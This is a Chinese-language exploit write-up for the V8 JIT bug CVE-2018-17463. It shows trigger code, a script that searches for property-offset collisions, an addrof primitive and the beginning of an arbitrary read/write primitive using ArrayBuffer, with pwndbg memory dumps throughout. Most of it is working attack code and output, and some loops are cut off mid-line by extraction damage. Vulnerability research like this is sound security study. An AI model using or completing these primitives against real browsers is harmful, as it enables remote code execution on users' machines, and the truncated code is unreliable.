    CheckHeapObject o
        CheckMap o, map1
        r0 = Load [o + 0x18]
        CheckHeapObject o
        CheckMap o, map1
        r1 = Load [o + 0x20]
        r2 = Add r0, r1
        CheckNoOverflow
        Return r2
可以看到第二次当`o`不变时，第二次`CheckMap o, map1`是多余的，这次检查节点是可以消除的。
在`src/compiler/checkpoint-elimination.cc:18`中，可以看到当两个检查节点中间的操作属性是`kNoWrite`时，则第二个检查节点时多余的。
    // The given checkpoint is redundant if it is effect-wise dominated by another
    // checkpoint and there is no observable write in between. For now we consider
    // a linear effect chain only instead of true effect-wise dominance.
    bool IsRedundantCheckpoint(Node* node) {
      Node* effect = NodeProperties::GetEffectInput(node);
      while (effect->op()->HasProperty(Operator::kNoWrite) &&
             effect->op()->EffectInputCount() == 1) {
        if (effect->opcode() == IrOpcode::kCheckpoint) return true;
        effect = NodeProperties::GetEffectInput(effect);
      }
      return false;
    }
那么利用这一点，可以构造一个函数，首先访问一次其内部变量，然后调用`Object.create`操作，再次访问另一个变量，那么可能造成第二个变量的类型检查消失，如果结合`DictionaryProperties`和`FastProperties`特性是可以构造一个非预期的情况。如首先构造一个数组`x`，初始化时赋予属性`a=0x1234`，增加属性`b=0x5678`，构造函数`bad_create`：首先访问`x.a`，这里可以通过类型检查，而在后续返回`x.b`，由于`JSCreate`的属性是`kNoWrite`的，则返回之前的`x.b`二次检查消失，造成仍然返回一个与`x.b`偏移相同的数据，但由于`Properties`的内存分布发生变化，一定不会是`0x5678`。
剩下的就是循环这个函数`10000`次，触发优化发生。
    function check_vul(){
        function bad_create(x){
            x.a;
            Object.create(x);
            return x.b;
        }
        for (let i = 0;i  ./d8 ./test/test.js
    5958
    CVE-2018-17463 exists in the d8
至此，取得了阶段性进展，可以稳定触发漏洞了。
### 类型混淆
当可以消除第二个检查节点后就可以获得`DictionaryProperties`的稳定偏移数据了。但是`DictionaryProperties`是一个`hash`表，其每次触发时对应的保存数据位置并不相同，可能存在随机化的因素在，如下是之前测试代码两次执行的`Properties`内存结构，可以发现各属性的偏移位置并不固定
第一次：
    pwndbg> v8print 0x1a8ce618e1d1
    0x1a8ce618e1d1: [JS_OBJECT_TYPE]
     - map: 0x0e4ccda8cbb1  [DictionaryProperties]
     - prototype: 0x2d0e328046d9 
     - elements: 0x180c3d382cf1  [HOLEY_ELEMENTS]
     - properties: 0x1a8ce618e4e1  {
       #c: 5 (data, dict_index: 5, attrs: [WEC])
       #d: 6 (data, dict_index: 6, attrs: [WEC])
       #x: 1 (data, dict_index: 1, attrs: [WEC])
       #y: 2 (data, dict_index: 2, attrs: [WEC])
       #z: 3 (data, dict_index: 3, attrs: [WEC])
       #b: 4 (data, dict_index: 4, attrs: [WEC])
     }
    $1 = 0
    pwndbg> x /20gx 0x1a8ce618e4e0
    0x1a8ce618e4e0: 0x0000180c3d383669  0x0000003500000000
    0x1a8ce618e4f0: 0x0000000600000000  0x0000000000000000
    0x1a8ce618e500: 0x0000001000000000  0x0000000700000000
    0x1a8ce618e510: 0x0000000000000000  0x00001ee0998868c9
    0x1a8ce618e520: 0x0000000500000000  0x000005c000000000
    0x1a8ce618e530: 0x0000180c3d3825a1  0x0000180c3d3825a1
    0x1a8ce618e540: 0x0000180c3d3825a1  0x00001ee0998850a1
    0x1a8ce618e550: 0x0000000600000000  0x000006c000000000
    0x1a8ce618e560: 0x0000180c3d3825a1  0x0000180c3d3825a1
    0x1a8ce618e570: 0x0000180c3d3825a1  0x0000180c3d3825a1
第二次：
    pwndbg> v8print 0x1bf5b6e0e1d1
    0x1bf5b6e0e1d1: [JS_OBJECT_TYPE]
     - map: 0x2fc05030cbb1  [DictionaryProperties]
     - prototype: 0x02b0bbe046d9 
     - elements: 0x2d44edf02cf1  [HOLEY_ELEMENTS]
     - properties: 0x1bf5b6e0e4e1  {
       #y: 2 (data, dict_index: 2, attrs: [WEC])
       #c: 5 (data, dict_index: 5, attrs: [WEC])
       #z: 3 (data, dict_index: 3, attrs: [WEC])
       #b: 4 (data, dict_index: 4, attrs: [WEC])
       #d: 6 (data, dict_index: 6, attrs: [WEC])
       #x: 1 (data, dict_index: 1, attrs: [WEC])
     }
    $1 = 0
    pwndbg> x /20gx 0x1bf5b6e0e4e0
    0x1bf5b6e0e4e0: 0x00002d44edf03669  0x0000003500000000
    0x1bf5b6e0e4f0: 0x0000000600000000  0x0000000000000000
    0x1bf5b6e0e500: 0x0000001000000000  0x0000000700000000
    0x1bf5b6e0e510: 0x0000000000000000  0x000021c78c806959
    0x1bf5b6e0e520: 0x0000000200000000  0x000002c000000000
    0x1bf5b6e0e530: 0x00002d44edf025a1  0x00002d44edf025a1
    0x1bf5b6e0e540: 0x00002d44edf025a1  0x00002d44edf025a1
    0x1bf5b6e0e550: 0x00002d44edf025a1  0x00002d44edf025a1
    0x1bf5b6e0e560: 0x000021c78c8068c9  0x0000000500000000
    0x1bf5b6e0e570: 0x000005c000000000  0x000021c78c806971
但发现另一规律：在一次执行过程中，相同属性构造的`Object`，在`DictionaryProperties`中的偏移是相同的：
执行如下代码：
    let a1 = {x : 1,y:2,z:3};
    a1.b = 4;
    a1.c = 5;
    a1.d = 6;
    let a2 = {x : 2,y:3,z:4};
    a2.b = 7;
    a2.c = 8;
    a2.d = 9;
    Object.create(a1);
    %DebugPrint(a1);
    Object.create(a2);
    %DebugPrint(a2);
    readline();
发现`a1`，`a2`即使属性值不同，但在`Properties`中属性名相同的仍存在同一位置。
    pwndbg> v8print 0x20913a10e231 
    0x20913a10e231: [JS_OBJECT_TYPE]
     - map: 0x351140b0cbb1  [DictionaryProperties]
     - prototype: 0x0e11c9a846d9 
     - elements: 0x011a73b82cf1  [HOLEY_ELEMENTS]
     - properties: 0x20913a10e599  {
       #z: 3 (data, dict_index: 3, attrs: [WEC])
       #b: 4 (data, dict_index: 4, attrs: [WEC])
       #y: 2 (data, dict_index: 2, attrs: [WEC])
       #c: 5 (data, dict_index: 5, attrs: [WEC])
       #x: 1 (data, dict_index: 1, attrs: [WEC])
       #d: 6 (data, dict_index: 6, attrs: [WEC])
     }
    $1 = 0
    pwndbg> v8print 0x20913a10e541
    0x20913a10e541: [JS_OBJECT_TYPE]
     - map: 0x351140b0cc51  [DictionaryProperties]
     - prototype: 0x0e11c9a846d9 
     - elements: 0x011a73b82cf1  [HOLEY_ELEMENTS]
     - properties: 0x20913a10e789  {
       #z: 4 (data, dict_index: 3, attrs: [WEC])
       #b: 7 (data, dict_index: 4, attrs: [WEC])
       #y: 3 (data, dict_index: 2, attrs: [WEC])
       #c: 8 (data, dict_index: 5, attrs: [WEC])
       #x: 2 (data, dict_index: 1, attrs: [WEC])
       #d: 9 (data, dict_index: 6, attrs: [WEC])
     }
    $2 = 0
    pwndbg> x /10gx 0x20913a10e598+0x38
    0x20913a10e5d0: 0x0000011a73b825a1  0x0000011a73b825a1
    0x20913a10e5e0: 0x0000011a73b825a1  0x000003c505686971
    0x20913a10e5f0: 0x0000000300000000  0x000003c000000000
    0x20913a10e600: 0x0000011a73b825a1  0x0000011a73b825a1
    0x20913a10e610: 0x0000011a73b825a1  0x00000e11c9aa2991
    pwndbg> x /10gx 0x20913a10e788+0x38
    0x20913a10e7c0: 0x0000011a73b825a1  0x0000011a73b825a1
    0x20913a10e7d0: 0x0000011a73b825a1  0x000003c505686971
    0x20913a10e7e0: 0x0000000400000000  0x000003c000000000
    0x20913a10e7f0: 0x0000011a73b825a1  0x0000011a73b825a1
    0x20913a10e800: 0x0000011a73b825a1  0x00000e11c9aa2991
那么我们可以得到一个结论，在一次利用中只要找到一对可以用于类型混淆的属性名就可以作为先验知识一直使用了。
我们可以通过构建一个对象，其中把属性名和属性值设置为有规律的键值对，如{'bi' => -(i+0x4869)
}，在恶意构造的函数中，返回全部可读的`Properties`值，通过其值的规律性，可以找到一对在属性改变先后可以对应的属性名`X1、X2`，达到恶意函数返回`a.x1`，实质上是返回a.X2的目的，从而造成类型混淆。
搜索`X1、X2`对的代码如下：
    // check collision between directory mode and fast mode
    let OPTIMIZATION_NUM = 10000
    let OBJ_LEN  = 0x30
    function getOBJ(){
        let res = {a:0x1234};
        for (let i = 0; i `let ${b} = x.${b};`).join('\n')}
                return [${find_obj.join(', ')}];
            }
        `);
        for (let i = 0; i -(1+OBJ_LEN +0x4869) ){
                    console.log('b'+ j +' & b' + -(tmp[j]+0x4869) +" are collision in directory");
                    return ['b'+j , 'b' + -(tmp[j]+0x4869)];
                }
            }
        }
        throw "not found collision ";
    }
    findCollision();
结果可发现，在每次执行中键值对都不同：
    ┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/CVE-2018-17463/v8/out/x64.release] - [四 6月 13, 12:57]
    └─[$]  ./d8 ./test/test.js
    b9 & b2 are collision in directory
    ┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/CVE-2018-17463/v8/out/x64.release] - [四 6月 13, 12:58]
    └─[$]  ./d8 ./test/test.js
    b15 & b7 are collision in directory
    ┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/CVE-2018-17463/v8/out/x64.release] - [四 6月 13, 13:06]
    └─[$]  ./d8 ./test/test.js
    b9 & b34 are collision in directory
此后，可以通过得到的键值对可以造成类型混淆了。
### addrof原语
通过得到的键值对设为`X,Y`，那么构建一个新的`Object`，
    o.X = {x1:1.1,x2:1.2};
    o.Y = {y1:obj};
并且构建恶意函数
    function bad_create(o){
                o.a;
                this.Object.create(o);
                return o.X.x1;
            }
那么在返回`o.X.x1`的时候，实际上返回的是`obj`结构体的地址，从而对浮点型进行转换就可以得到对应obj地址了。
### 任意地址读写原语
同样利用上文属性值对，与`addrof`原语类似，当访问键值`X`时，实际上是对键值`Y`属性值相对偏移的操作。
对于任意地址读写，我们可以想到一个好用的数据结构`ArrayBuffer`。一个`ArrayBuffer`的结构体如下：
    pwndbg> v8print 0x1d4b8ef8e1a9
    0x1d4b8ef8e1a9: [JSArrayBuffer]
     - map: 0x350743c04371  [FastProperties]
     - prototype: 0x29b14b610fd1 
     - elements: 0x236c6c482cf1  [HOLEY_ELEMENTS]
     - embedder fields: 2
     - backing_store: 0x5652a87208f0
     - byte_length: 1024
     - neuterable
     - properties: 0x236c6c482cf1  {}
     - embedder fields = {
        (nil)
        (nil)
     }
    $1 = 0